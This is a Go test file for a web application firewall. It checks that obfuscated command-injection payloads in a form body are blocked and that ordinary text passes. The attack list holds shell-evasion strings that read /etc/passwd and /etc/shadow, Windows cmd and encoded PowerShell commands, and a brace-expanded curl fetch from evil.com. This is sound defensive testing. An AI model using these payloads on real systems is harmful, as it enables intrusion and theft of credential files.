package engine

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"wewaf/internal/core"
)

// rceBodyBlocked runs a payload as a urlencoded form body through both phases.
func rceBodyBlocked(eng *Engine, payload string) bool {
	b := "cmd=" + url.QueryEscape(payload)
	req := httptest.NewRequest(http.MethodPost, "/run", strings.NewReader(b))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	tx := core.NewTransaction(nil, req, nil)
	tx.SetMetadata("body", []byte(b))
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// TestRCEObfuscationBlocked covers shell-obfuscation evasion techniques: the
// detection targets the technique's structure ($IFS, brace expansion, Windows
// encoded-command) or its goal (the sensitive target file) rather than only
// the literal command, so quote/backslash/wildcard command-splitting that
// hides the command but still reads /etc/passwd is caught.
func TestRCEObfuscationBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	attacks := []string{
		"cat$IFS$9/etc/passwd",                       // bare $IFS whitespace evasion
		"cat${IFS}/etc/passwd",                       // braced IFS
		"{cat,/etc/passwd}",                          // brace expansion
		"{curl,http://evil.com/x}",                   // brace expansion, external fetch
		"c'a't /etc/passwd",                          // quote-split command
		`c\at /etc/passwd`,                           // backslash-split command
		`ca""t /etc/passwd`,                          // double-quote-split command
		"/bin/c?t /etc/passwd",                       // wildcard command
		"/???/cat /etc/passwd",                       // wildcard path
		"cat /etc/shadow",                            // sensitive target
		"cmd /c whoami",                              // windows cmd
		"cmd.exe /c dir",                             // windows cmd.exe
		"powershell -enc ZQBjAGgAbwAgaGk=",           // ps encoded (abbrev)
		"powershell.exe -EncodedCommand ZQBjAGgAbwA", // ps encoded (full)
	}
	for _, p := range attacks {
		p := p
		t.Run(p, func(t *testing.T) {
			if !rceBodyBlocked(eng, p) {
				t.Errorf("RCE obfuscation not blocked: %q", p)
			}
		})
	}
}

// TestRCEObfuscationNoFalsePositive confirms the new RCE rules don't fire on
// ordinary prose / structured data that merely resembles the patterns.
func TestRCEObfuscationNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	legit := []string{
		"normal text about cats and dogs",
		"{name, value}",                   // JS object literal (space after comma)
		"config: {timeout, retries}",      // JS-ish, space after comma
		"powershell scripting tutorial",   // word "powershell" without exec
		"please update the cmd reference", // word "cmd" without /c
		"my notes about ssh and aws",
		`{"key":"value","n":1}`, // JSON
	}
	for _, p := range legit {
		p := p
		t.Run(p, func(t *testing.T) {
			if rceBodyBlocked(eng, p) {
				t.Errorf("legit body wrongly blocked as RCE: %q", p)
			}
		})
	}
}
